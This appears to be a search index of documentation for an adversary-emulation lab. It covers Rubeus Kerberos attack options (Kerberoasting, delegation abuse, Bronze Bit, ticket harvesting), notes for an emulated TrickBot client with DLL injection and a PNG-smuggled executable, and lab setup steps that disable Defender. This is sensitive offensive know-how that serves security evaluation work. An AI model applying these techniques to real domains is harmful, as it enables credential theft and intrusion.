with the /opsec changes, the /force flag exists.","Requesting a ticket via RC4 hash for dfm.a@testlab.local, applying it to the current logon session:","Requesting a ticket via aes256_hmac hash for dfm.a@testlab.local, starting a new hidden process and applying the ticket to that logon session. Note: elevation needed!","Note that the /luid and /createnetonly parameters require elevation!"]},{"l":"asktgs","p":["The asktgs action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The /ptt flag will \"pass-the-ticket\" and apply the resulting service ticket to the current logon session. One or more /service:X SPNs must be specified, comma separated.","The supported encryption types in the constructed TGS-REQ will be RC4_HMAC, AES128_CTS_HMAC_SHA1, and AES256_CTS_HMAC_SHA1. In this case, the highest mutually supported encryption will be used by the KDC to build the returned service ticket. If you want to force DES, RC4, or AES128/256 keys, use /enctype:[RC4|AES128|AES256|DES].","In order to request a service ticket for an account using an enterprise principal (i.e. user@domain.com), the /enterprise flag can be used.","By default, several differences exists between TGS-REQ's generated by Rubeus and genuine TGS-REQ's. To form TGS-REQ's more inline with genuine requests, the /opsec flag can be used, this will also cause an additional TGS-REQ to be sent automatically when a service ticket is requested for an account configured for unconstrained delegation. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than aes256 and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the /opsec changes, the /force flag exists.","To play with other scenarios manually, /tgs:X can be used to supply an additional ticket which is appended to the request body. This also adds the constrained delegation KDC option as well as avoids dynamically determining the domain from the given SPN /service:X, for this reason the /usesvcdomain flag has been implemented to force the request to use the domain from the given SPN /service:X which is useful for requesting delegated service tickets from a foreign domain.","Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the \"LDAP/primary.testlab.local\" and \"cifs/primary.testlab.local\" SPNs:","Requesting a service ticket for an AES-enabled service account, specifying that we only support RC4_HMAC:"]},{"l":"renew","p":["The renew action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The /ptt flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session.","Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.","The /autorenew flag will take an existing /ticket:X.kirbi file/blob, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes."]},{"l":"brute","p":["The brute action will perform a Kerberos-based password bruteforcing attack."]},{"l":"Constrained delegation abuse","p":["Breakdown of the constrained delegation commands:","Command","Description","s4u","Perform S4U2self and S4U2proxy actions"]},{"l":"s4u","p":["The s4u action is nearly identical to Kekeo's tgs::s4u functionality. If a user (or computer) account is configured for constrained delegation (i.e. has a SPN value in its msds-allowedtodelegateto field) this action can be used to abuse access to the target SPN/server. Constrained delegation is complex. For more information see this post or Elad Shamir's \"Wagging the Dog\" post.","A TL;DR explanation is that an account with constrained delegation enabled is allowed to request tickets to itself as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have TrustedToAuthForDelegation enabled in it's useraccountcontrol property, something that only elevated users can modify by default. This ticket has the FORWARDABLE flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account's msds-allowedtodelegateto field. So long story short, if you have control of an account with TrustedToAuthForDelegation set and a value in msds-allowedtodelegateto, you can pretend to be any user in the domain to the SPNs set in the account's msds-allowedtodelegateto field.","This \"control\" can be the hash of the account (/rc4 or /aes256), or an existing TGT (/ticket:X) for the account with a msds-allowedtodelegateto value set. If a /user and rc4/aes256 hash is supplied, the s4u module performs an asktgt action first, using the returned ticket for the steps following. If a TGT /ticket:X is supplied, that TGT is used instead.","A /impersonateuser:X parameter MUST be supplied to the s4u module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:","That forwardable ticket can then be used as a /tgs:Y parameter (base64 blob or .kirbi file) to execute the S4U2proxy process. A valid msds-allowedtodelegateto value for the account must be supplied (/msdsspn:X). Say the patsy@testlab.local account looks like this:","Then the S4U2proxy abuse function (using the ticket from the previous S4U2self process) would be:","Where /ticket:X is the TGT returned in the first step, and /tgs is the S4U2self ticket. Injecting the resulting ticket (manually with Rubeus.exe ptt /ticket:X or by supplying the /ptt flag to the s4u command) will allow you access the ldap service on primary.testlab.local as if you are dfm.a.","The /altservice parameter takes advantage of Alberto Solino's great discovery about how the service name (sname) is not protected in the KRB-CRED file, only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (/altservice:cifs,HOST,...).","Let's expand on the previous example, forging access to the filesystem on primary.testlab.local by abusing its constrained delegation configuration and the alternate service substitution. Let's package it all into one step as well, performing a TGT request, S4U2self process, S4U2proxy execution, and injection of the final ticket:","By default, several differences exists between the S4U2Self and S4U2Proxy TGS-REQ's generated by Rubeus and genuine requests. To form the TGS-REQ's more inline with genuine requests, the /opsec flag can be used. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than aes256 and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the /opsec changes, the /force flag exists. The /opsec flag has not yet been implemented for cross domain S4U.","The Bronze Bit exploit (CVE-2020-17049) is implemented using the /bronzebit flag. Adding this flag will automatically flip the forwardable flag when retreiving the S4U2Self ticket. As flipping this flag requires the service ticket to be decrypted and reencrypted, the long term key (service account's password hash) is required. For this reason, if a TGT is being supplied, the service accounts credentials are also required for this to work.","It is possible, in certain cirsumstances, to use an S4U2Self ticket to impersonate protected users in order to escalate privileges on the requesting system, as discussed here. For this purpose, the /self flag and /altservice:X argument can be used to generate a usable service ticket.","To forge an S4U2Self referral, only the trust key is required. By using the /targetdomain:X argument with the /self flag and without the /targetdc argument, Rubeus will treat the ticket supplied with /ticket:X as an S4U2Self referral and only request the final S4U2Self service ticket. The /altservice:X can also be used to rewrite the sname in the resulting ticket:"]},{"l":"Ticket Management","p":["Breakdown of the ticket management commands:","Command","Description","ptt","Apply a ticket to the current (or specified) logon session","purge","Purge the current (or specified) logon session of Kerberos tickets","describe","Describe a ticket base64 blob or .kirbi file"]},{"l":"ptt","p":["The ptt action will submit a /ticket:X(TGT or service ticket) for the current logon session through the LsaCallAuthenticationPackage() API with a KERB_SUBMIT_TKT_REQUEST message, or ( if elevated) to the logon session specified by /luid:0xA... Like other /ticket:X parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.","Elevated ticket application to another logon session:"]},{"l":"purge","p":["The purge action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by /luid:0xA...","Elevated purging of another logon session:"]},{"l":"describe","p":["The describe action takes a /ticket:X value (TGT or service ticket), parses it, and describes the values of the ticket. Like other /ticket:X parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.","If the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Kerberoast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.","Display information about a TGT:","Display information about service ticket with an extracted Kerberoast hash:"]},{"l":"Ticket Extraction and Harvesting","p":["Breakdown of the ticket extraction/harvesting commands:","Command","Description","Detailed logon session and ticket data","Detailed logon session and ticket info","dump","harvest","klist","LUID, username, service target, ticket expiration","monitor","Monitor logon events and dump new tickets","Note: triage/ klist/ dump give increasing amounts of ticket detail.","Retrieve usable TGT for non-elevated user","Same as monitor but with auto-renewal functionality","tgtdeleg","triage"]},{"l":"triage","p":["The triage action will output a table of the current user's Kerberos tickets, if not elevated. If run from an elevated context, a table describing all Kerberos tickets on the system is displayed. Ticket can be filtered for a specific service with /service:SNAME.","If elevated, tickets can be filtered for a specific LogonID with /luid:0xA.. or a specific user with /user:USER. This can be useful when triaging systems with a lot of Kerberos tickets.","Triage all enumerateable tickets (non-elevated):","Triage all enumerateable tickets (elevated):","Triage targeting a specific service (elevated):"]},{"l":"klist","p":["The klist will list detailed information on the current user's logon session and Kerberos tickets, if not elevated. If run from an elevated context, information on all logon sessions and associated Kerberos tickets is displayed. Logon and ticket information can be displayed for a specific LogonID with /luid:0xA..(if elevated).","Listing the current (non-elevated) user's logon session and Kerberos ticket information:","Elevated listing of another user's logon session/Kerberos ticket information:"]},{"l":"dump","p":["The dump action will extract current TGTs and service tickets if in an elevated context. If not elevated, service tickets for the current user are extracted. The resulting extracted tickets can be filtered by /service(use /service:krbtgt for TGTs) and/or logon ID (the /luid:0xA.. parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's kerberos::ptt functionality.","Note: if run from a non-elevated context, the session keys for TGTs are not returned (by default) from the associated APIs, so only service tickets extracted will be usable. If you want to (somewhat) workaround this, use the tgtdeleg command.","Extracting the current user's usable service tickets:","Elevated extraction of tickets from a specific logon session:","Elevated extraction of all TGTs on a system:"]},{"l":"tgtdeleg","p":["The tgtdeleg using @gentilkiwi's Kekeo trick ( tgt::deleg) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.","If automatic target/domain extraction is failing, a known SPN of a service configured with unconstrained delegation can be specified with /target:SPN."]},{"l":"monitor","p":["The monitor action will periodically extract all TGTs every /monitorinterval:X seconds (default of 60) and display any newly captured TGTs. A /targetuser:USER can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)","When the /targetuser:USER(or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.","The /nowrap flag causes the base64 encoded ticket output to no wrap per line.","If you want monitor to run for a specific period of time, use /runfor:SECONDS.","Further, if you wish to save the output to the registry, pass the /registry flag and specfiy a path under HKLM to create (e.g., /registry:SOFTWARE\\MONITOR). Then you can remove this entry after you've finished running Rubeus by Get-Item HKLM:\\SOFTWARE\\MONITOR\\ | Remove-Item -Recurse -Force.","Note that this action needs to be run from an elevated context!"]},{"l":"harvest","p":["The harvest action takes monitor one step further. It periodically extract all TGTs every /monitorinterval:X seconds (default of 60), extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. Every interval, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit). Every /displayinterval:X seconds (default of 1200) and the current cache of \"usable\"/valid TGT KRB-CRED .kirbis are output as base64 blobs.","This allows you to harvest usable TGTs from a system without opening up a read handle to LSASS, though elevated rights are needed to extract the tickets.","The /nowrap flag causes the base64 encoded ticket output to no wrap per line.","If you want harvest to run for a specific period of time, use /runfor:SECONDS.","Further, if you wish to save the output to the registry, pass the /registry flag and specfiy a path under HKLM to create (e.g., /registry:SOFTWARE\\MONITOR). Then you can remove this entry after you've finished running Rubeus by Get-Item HKLM:\\SOFTWARE\\MONITOR\\ | Remove-Item -Recurse -Force.","Note that this action needs to be run from an elevated context!"]},{"l":"Roasting","p":["Breakdown of the roasting commands:","Command","Description","kerberoast","Perform Kerberoasting against all (or specified) users","asreproast","Perform AS-REP roasting against all (or specified) users"]},{"l":"kerberoast","p":["If the /aes flag is supplied, accounts with AES encryption enabled in msDS-SupportedEncryptionTypes are enumerated and AES service tickets are requested.","If the /autoenterprise flag is used, if roasting an SPN fails (due to an invalid or duplicate SPN) Rubeus will automatically retry using the enterprise principal. This is only useful when /spn or /spns is not supplied as Rubeus needs to know the target accounts samaccountname, which it gets when querying LDAP for the account information.","If the /delay:MILLISECONDS argument is specified, that number of milliseconds is paused between TGS requests. The /jitter:1-100 flag can be combined for a % jitter.","If the /enterprise flag is used, the spn is assumed to be an enterprise principal (i.e. user@domain.com). This flag only works when kerberoasting with a TGT.","If the /ldapfilter:X argument is supplied, the supplied LDAP filter will be added to the final LDAP query used to find Kerberoastable users.","If the /nowrap flag is specified, Kerberoast results will not be line-wrapped.","If the /pwdsetafter:MM-dd-yyyy argument is supplied, only accounts whose password was last changed after MM-dd-yyyy will be enumerated and roasted.","If the /pwdsetbefore:MM-dd-yyyy argument is supplied, only accounts whose password was last changed before MM-dd-yyyy will be enumerated and roasted.","If the /rc4opsec flag is specified, the tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.","If the /resultlimit:NUMBER argument is specified, the number of accounts that will be enumerated and roasted is limited to NUMBER.","If the /simple flag is specified, roasted hashes will be output to the console, one per line.","If the /tgtdeleg flag is supplied, the tgtdeleg trick it used to get a usable TGT for the current user, which is then used for the roasting requests. If this flag is used, accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.","If the the TGT /ticket:X supplied (base64 encoding of a .kirbi file or the path to a .kirbi file on disk) that TGT is used to request the service service tickets during roasting. If /ticket:X is used with /spn:Y or /spns:Y(/spns: can be a file containing each SPN on a new line or a comma separated list) then no LDAP searching happens for users, so it can be done from a non-domain joined system in conjunction with /dc:Z.","If you want to use alternate domain credentials for Kerberoasting (and searching for users to Kerberoast), they can be specified with /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD.","The /outfile:FILE argument outputs roasted hashes to the specified file, one per line.","The /stats flag will output statistics about kerberoastable users found, including a breakdown of supported encryption types and years user passwords were last set. This flag can be combined with other targeting options.","The kerberoast action replaces the SharpRoast project's functionality. Like SharpRoast, this action uses the KerberosRequestorSecurityToken.GetRequest Method() method that was contributed to PowerView by @machosec in order to request the proper service ticket (for default behavior, opsec table for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.","With no other arguments, all user accounts with SPNs set in the current domain are Kerberoasted, requesting their highest supported encryption type(see the opsec table). The /spn:X argument roasts just the specified SPN, the /user:X argument roasts just the specified user, and the /ou:X argument roasts just users in the specific OU. The /domain and /dc arguments are optional, pulling system defaults as other actions do."]},{"l":"kerberoasting opsec","p":["/aes","/aes /tgtdeleg","/pwdsetafter:X","/pwdsetbefore:X","/rc4opsec","/resultlimit:X","/tgtdeleg","/ticket:X","Arguments","Description","Enumerate accounts with AES enabled, use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption","Here is a table comparing the behavior of various flags from an opsec perspective:","none","Use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption","Use the specified number to limit the accounts that will be roasted","Use the supplied date and only enumerate accounts with password last changed after that date","Use the supplied date and only enumerate accounts with password last changed before that date","Use the supplied TGT blob/file for TGS-REQ requests, roast all accounts w/ RC4 specified","Use the tgtdeleg trick to perform TGS-REQ requests of RC4-enabled accounts, roast all accounts w/ RC4 specified","Use the tgtdeleg trick, enumerate accounts with AES enabled, roast w/ AES specified","Use the tgtdeleg trick, enumerate accounts without AES enabled, roast w/ RC4 specified"]},{"l":"Examples","p":["Kerberoasting all users in the current domain using the default KerberosRequestorSecurityToken.GetRequest method:","Kerberoasting all users in a specific OU, saving the hashes to an output file:","Perform Kerberoasting using the tgtdeleg trick to get a usable TGT, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 3 service tickets:","List statistics about found Kerberoastable accounts without actually sending ticket requests:","Kerberoasting a specific user, with simplified hash output:","Kerberoasting all users in a foreign trusting domain, not line-wrapping the results:","Kerberoasting using an existing TGT:","\"Opsec\" Kerberoasting, using the tgtdeleg trick, filtering out AES-enabled accounts:"]},{"l":"asreproast","p":["The asreproast action replaces the ASREPRoast project which executed similar actions with the (larger sized) BouncyCastle library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting. For more technical information, see this post.","Just as with the kerberoast command, if no other arguments are supplied, all user accounts not requiring with Kerberos preauth not required are roasted. The /user:X argument roasts just the specified user, and the /ou:X argument roasts just users in the specific OU. The /domain and /dc arguments are optional, pulling system defaults as other actions do.","The /outfile:FILE argument outputs roasted hashes to the specified file, one per line.","Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD.","The output /format:X defaults to John the Ripper ( Jumbo version). /format:hashcat is also an option for the new hashcat mode 18200.","AS-REP roasting all users in the current domain:","AS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:","AS-REP roasting a specific user:","AS-REP roasting all users in a foreign trusting domain:","AS-REP roasting users in a foreign non-trusting domain using alternate credentials:"]},{"l":"Miscellaneous","p":["Breakdown of the miscellaneous commands:","Command","Description","createnetonly","Create a process of logon type 9","changepw","Perform the Aorato Kerberos password reset","hash","Hash a plaintext password to Kerberos encryption keys","tgssub","Substitute in alternate service names into a service ticket","currentluid","Display the current user's LUID"]},{"l":"createnetonly","p":["The createnetonly action will use the CreateProcessWithLogonW() API to create a new hidden (unless /show is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the ptt /luid:0xA.. parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.","Create a hidden upnpcont.exe process:","Create a visible command prompt:"]},{"l":"changepw","p":["The changepw action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified /new:PASSWORD value. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's misc::changepw function.","You can retrieve a TGT blob using the asktgt command."]},{"l":"hash","p":["The hash action will take a /password:X and optional /user:USER and/or /domain:DOMAIN. It will generate the rc4_hmac (NTLM) representation of the password using @gentilkiwi's kerberos:hash(KERB_ECRYPT HashPassword) approach. If user and domain names are specified, the aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hash forms are generated. The user and domain names are used as salts for the AES and DES implementations.","Calculating the rc4_hmac of a password:","Calculating all hash formats:"]},{"l":"tgssub","p":["The tgssub action will take a service ticket base64 blob/file specification and substitute an alternate service name into the ticket. This is useful for S4U abuse and other scenarios.","The /altservice:X flag is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir's post on the topic for more information.","The /ptt flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session. The /luid:0xA.. flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.","Executing the S4U2self/S4U2proxy proces to abuse traditional constrained delegation, and replacing the sname in the final ticket. This is so you don't have to execute the S4U process for a second time:","Executing S4U2self to a machine using its machine account hash, substituting in the service names we want to abuse after:"]},{"l":"currentluid","p":["The currentluid action will display the current user's logon ID (LUID)."]},{"l":"Compile Instructions","p":["We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)","Rubeus has been built against .NET 3.5 and is compatible with Visual Studio 2019 Community Edition. Simply open up the project .sln, choose \"Release\", and build."]},{"l":"Targeting other .NET versions","p":["Rubeus' default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target Rubeus for .NET 4 or 4.5, open the .sln solution, go to Project-> Rubeus Properties and change the \"Target framework\" to another version."]},{"i":"sidenote-building-rubeus-as-a-library","l":"Sidenote: Building Rubeus as a Library","p":["To build Rubeus as a library, under Project-> Rubeus Properties-> change Output type to Class Library. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:","You can then use ILMerge to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file."]},{"i":"sidenote-running-rubeus-through-powershell","l":"Sidenote: Running Rubeus Through PowerShell","p":["If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:","Rubeus can then be loaded in a PowerShell script with the following (where \"aa...\" is replaced with the base64-encoded Rubeus assembly string):","The Main() method and any arguments can then be invoked as follows:","Or individual functions can be invoked:"]},{"i":"sidenote-sidenote-running-rubeus-over-psremoting","l":"Sidenote Sidenote: Running Rubeus Over PSRemoting","p":["Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Rubeus has a function to help with that.","If you follow the instructions in Sidenote: Running Rubeus Through PowerShell to create a Rubeus.ps1, append something like the following to the script:","You should then be able to run Rubeus over PSRemoting with something like the following:","Alternatively, Rubeus' /consoleoutfile:C:\\FILE.txt argument will redirect all output streams to the specified file."]}],[{"l":"TrickBot"},{"l":"Overview","p":["The Trickbot client is broken up into the following components - TrickBotClientExe, ReflectiveDLLInjection, ModuleDiscoverPSE, and Module64. These four components are responsible for C2 communications, reflective DLL injection, and information gathering/persistence mechanisms via DLL's."]},{"l":"TrickbotClientExe","p":["The main executable that is responsible for C2 registration and communication. This executable is designed to be kicked off by Emotet[1]. When building this code, the executable will be output as TrickbotClientExe.exe in the folder TrickBotClientExe\\x64\\Release. The code is currently printing command output, this should be removed for production. The Trickbot C2 commands are broken up into the following structure:","To run TrickbotClientExe via command line for testing"]},{"l":"Registration Command","p":["The function getBotKey() generates a Trickbot encryption key that is used to encrypt DLL's and config files that are sent down to a victim machine. Encryption is not currently implemeneted."]},{"l":"Get Tasks","p":["This request is sent to the server every N number of seconds to check if the C2 server has a job for the client to perform. This request is called within the main function of TrickBotClientExe and continiously loops until the Trickbot Handler kills the clent connection."]},{"l":"Post Command Output","p":["This request will send command line output to the Trickbot handler. The request itself is sent using WinHTTP."]},{"l":"Download File","p":["This request will download a file that the server tells the client to download. The requests is sent using WinHTTP."]},{"l":"Upload File","p":["This request will upload a file from the client to the c2 server. The reuest is sent using WinHTTTP. Because this function wont be used a ton by the Trickbot C2, the current implementation reads the file to upload into a String and then sends the string in a post request. This implmentation should not be used to upload binary files are large files. Small text files with \"discovery\" information should work fine."]},{"i":"command-ids","l":"Command ID's","p":["Command ID's are stored in an ENUM and used to define which commands are being sent to the TrickBotHandler. Routes are setup within the Trickbot handler to check the Command ID and then route the request to the correct endpoint."]},{"l":"ReflectiveDLLInjection","p":["An executable responsible for reflectively injecting DLL's into processes. This file is compiled into an executable instead of a DLL. This is a slight derivation from the CTI [1]. When building this code, the executable will be output as inject.64.exe in the folder ReflectiveDLLInjection\\x64\\Release. The functionality of this code mimics that of Loader.dll described in the CTI. This program can be executed by TrickbotClientExe - see Emulation plan for more information. inject.64.exe only injects into svchost.exe.","To inject into svchost run the following command","If you need to change the process to inject to you can edit this line in Inject.c. Please note that you must be running as an Administrator or a high integrity process to be able to inject into svchost.exe.","Testing:","If you are testing a new Reflective DLL and are using MessageBox's to debug your code, you should change the process to inject into to be a user level process like \"notepad.exe\". This will allow you to see the MessageBox output. If you try this with svchost.exe it your DLL will hang and you will see no output from your DLL."]},{"l":"ModuleDiscoverPSE","p":["Update: I had issues getting command output to be written to a file using this DLL. Please follow steps in the emulation plan to manually run these commands with the Trickbot client.","A DLL that can be reflectively loaded by inject.x64.exe. This module is equivalent to DLL.dll referenced in the CTI [1]. This DLL runs multiple system commands including nltest, ipconfig, and net commands. The command output is written to a file on disk called out.txt. Discovery.txt must be back hauled by the C2 manually - see Emulation plan for more information. When building this code, the DLL will be output as ModuleDiscoveryPSE.x64.dll in the folder ModuleDiscoveryPSE\\x64\\Release."]},{"l":"Module64","p":["A DLL that can be reflectively loaded by inject.x64.exe. This module is equivalent to MODULE64.DLL referenced in the CTI [1]. This DLL will transform a file named radiance.png into a file called tsickbot.exe and copy it to other locations on the filesystem and network fileshares. When building this code, the DLL will be output as Module64.x64.dll in the folder Module64\\x64\\Release","To build radiance.png - I used a PNG file called diamond.png,","Run the command below to append the contents of the main trickbot executable to a png called radiance.png","Please note that diamond.png must be used to create radiance.png. The filesize of diamong.png is hard coded in Module64 and used as a filepointer location to carve the trickbot executable out of the PNG. This module is hardcoded to look for radiance.png in C:\\Users{username}\\AppData\\Roaming\\WNetval\\radiance.png","To run this DLL:"]},{"i":"note-on-reflective-dlls","l":"Note on Reflective DLL's","p":["If new DLL's need to be created for any reason please ensure that the configurations exactly match the other reflective DLL's within this repo - the following files are required - ReflectiveDLLInjection.h, ReflectiveDLLInjection.c, and ReflectiveLoader.h. I had issues using C++ when writing these DLL's - Windows API's and C worked without issue."]},{"l":"Folder Structuring","p":["The Trickbot folder that is copied onto a victim system should look like the following","This folder or its individual contents should be copied to \"C:\\Users{username}\\AppData\\Roaming\\WNetval\""]},{"l":"Issues","p":["Any forseeable issues were created as Issues. Please reference the Issue titles that start with \"Trickbot\""]},{"l":"References","p":["[1] https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware"]}],[{"l":"About","p":["Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. As such the library is responsible for loading itself by implementing a minimal Portable Executable (PE) file loader. It can then govern, with minimal interaction with the host system and process, how it will load and interact with the host.","Injection works from Windows NT4 up to and including Windows 8, running on x86, x64 and ARM where applicable."]},{"l":"Overview","p":["The process of remotely injecting a library into a process is two fold. Firstly, the library you wish to inject must be written into the address space of the target process (Herein referred to as the host process). Secondly the library must be loaded into that host process in such a way that the library's run time expectations are met, such as resolving its imports or relocating it to a suitable location in memory.","Assuming we have code execution in the host process and the library we wish to inject has been written into an arbitrary location of memory in the host process, Reflective DLL Injection works as follows.","Execution is passed, either via CreateRemoteThread() or a tiny bootstrap shellcode, to the library's ReflectiveLoader function which is an exported function found in the library's export table.","As the library's image will currently exists in an arbitrary location in memory the ReflectiveLoader will first calculate its own image's current location in memory so as to be able to parse its own headers for use later on.","The ReflectiveLoader will then parse the host processes kernel32.dll export table in order to calculate the addresses of three functions required by the loader, namely LoadLibraryA, GetProcAddress and VirtualAlloc.","The ReflectiveLoader will now allocate a continuous region of memory into which it will proceed to load its own image. The location is not important as the loader will correctly relocate the image later on.","The library's headers and sections are loaded into their new locations in memory.","The ReflectiveLoader will then process the newly loaded copy of its image's import table, loading any additional library's and resolving their respective imported function addresses.","The ReflectiveLoader will then process the newly loaded copy of its image's relocation table.","The ReflectiveLoader will then call its newly loaded image's entry point function, DllMain with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.","Finally the ReflectiveLoader will return execution to the initial bootstrap shellcode which called it, or if it was called via CreateRemoteThread, the thread will terminate."]},{"l":"Build","p":["Open the 'rdi.sln' file in Visual Studio C++ and build the solution in Release mode to make inject.exe and reflective_dll.dll"]},{"l":"Usage","p":["To test use the inject.exe to inject reflective_dll.dll into a host process via a process id, e.g.:","inject.exe 1234"]},{"l":"License","p":["Licensed under a 3 clause BSD license, please see LICENSE.txt for details."]}],[{"l":"Wizard Spider Setup Procedure"},{"l":"Clone the repo","p":["git clone the wizard spider repo into your home directory:","Note that this requires having read access to our repo and multi-factor authentication setup."]},{"l":"Configure Domain Controller","p":["RDP into domain controller","Open Windows Defender, toggle all nobs to the off position. Also go to App and Browser control and turn off Smart Screen.","Open PowerShell being sure to select \"Run as Administrator\":","Next we need to download Microsoft Visual C++ Redistributable.","Open FireFox; close all spurious prompts / decline everything.","Go to this page:","https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0","Download and install the 32-bit and 64-bit versions.","Reboot the workstation"]},{"i":"configure-dorothy--10007","l":"Configure Dorothy / 10.0.0.7","p":["Close Word and outlook.","Configure Outlook and office?","Download and install the 32-bit and 64-bit versions.","For local testing:","Go to this page:","https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0","Log back into Dorothy as user judy","Next we need to download Microsoft Visual C++ Redistributable.","Open an Administrator CMD.exe","Open Edge; close all spurious prompts / decline everything.","Open PowerShell being sure to select \"Run as Administrator\":","Open Windows Defender, toggle all nobs to the off position.","Open Word and Outlook; surpress all spurious prompts.","RDP into Dorothy","Reboot the workstation","Run this command to take ownership of a privileged directory:","Sign out of the RDP session."]},{"i":"configure-toto--10008","l":"Configure Toto / 10.0.0.8","p":["RDP into Toto","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot the workstation"]}],[{"l":"File Generator","p":["File generator used to populate a target machine with representative files. Uses templates (supplied in the templates folder), currently covering the following file types:","Files are populated in the Documents and Desktop directories for each sub-directory in the initial target directory. Running the program requires root/administrator access to avoid issues with file distribution. Default file names are random per run and per folder. If a seed value is provided, the folders will receive the same file names in every folder receiving a distribution. This can be used to ensure exact scenario recreation on subsequent runs."]},{"l":"User Options"},{"l":"Usage Examples","p":["Example (executable co-located with templates, seed value of \"EVALS\", no prompts on folder creation):",".\\generate-files.exe -d c:\\test -c 50 --seed EVALS --noprompt","Example (Python file located away from templates, prompt prior to folder creation):","python3 .\\generate-files.py -d c:\\test -t c:\\users\\public\\templates -c 150"]},{"l":"Creating a New Executable","p":["While an executable has been supplied alongside the Python file, if you choose to make changes to the Python file (such as changing the file names or additional user folders to populate) and wish to re-compile it, install PyInstaller with pip:","pip install pyinstaller","You may need to add the installation directory to your PATH environment variable. In PowerShell:","PS $env:Path += ;path to pyinstaller provided via pip","Finally, compile the program with the --console flag to ensure output from the program.","pyinstaller --onefile --console .\\generate-files.py"]},{"l":"User Tracking Information","p":["Generated files currently will have one of the following names, followed by an underscore and a random 6-character Alpha string.","The program will provide console output regarding where, and how many, files were written.","Example output:"]}],[{"l":"Cleanup","p":["Upload-execute cleanup_dorthy.ps1"]},{"l":"Ryuk Cleanup","p":["RDP into wizard/10.0.0.4","Copy and run cleanup-ryuk.ps1 to clear out the RyukReadMe.txt files, the executable and any leftover ryuk files","Delete the ps1 script","Run net use and check if the Z: drive is present indicating connection to toto \\10.0.0.8\\C$.","If it 